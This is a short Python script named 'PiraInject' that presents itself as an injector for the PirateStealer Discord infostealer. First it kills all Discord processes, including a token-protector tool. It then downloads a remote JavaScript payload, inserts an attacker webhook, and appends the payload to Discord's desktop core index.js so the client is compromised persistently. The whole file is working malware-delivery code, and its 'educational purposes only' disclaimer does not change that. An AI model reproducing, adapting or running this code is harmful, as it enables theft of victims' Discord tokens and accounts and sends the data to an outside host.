"""
--> PiraInject
This is simply a injector for PirateStealer,
We are not affiliated with the owner of PirateStealer nor do we condone
infecting people with malware, this was simply coded for educational purposes only.
--> cyphed
"""
import os
import httpx
import psutil

sep = os.sep
webhook = ""
appdata = os.getenv("localappdata")
injURL = "https://github.com/Stanley-GF/PirateStealer/raw/main/src/injection/injection-minified.js"

def injectDiscord():
    for _dir in os.listdir(appdata):
        if 'discord' in _dir.lower():
            discord = appdata+sep+_dir
            disc_sep = discord+sep
            for __dir in os.listdir(os.path.abspath(discord)):
                if match(r'app-(\d*\.\d*)*', __dir):
                    app = os.path.abspath(disc_sep+__dir)
                    injPath = app+'\\modules\\discord_desktop_core-3\\discord_desktop_core\\'
                    if os.path.exists(injPath):
                       g = httpx.get(injURL).text.replace("%WEBHOOK%", webhook)
                       f = open(f"{injPath}/index.js", "a")
                       f.write(g)
                       f.close()
                       os.startfile(app + sep + _dir + '.exe')

def killDiscord():
    for proc in psutil.process_iter():
        if any(procstr in proc.name().lower() for procstr in ['discord', 'discordtokenprotector', 'discordcanary', 'discorddevelopment', 'discordptb']):
            try:
                proc.kill()
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                pass

if __name__ == "__main__":
    killDiscord()
    injectDiscord()
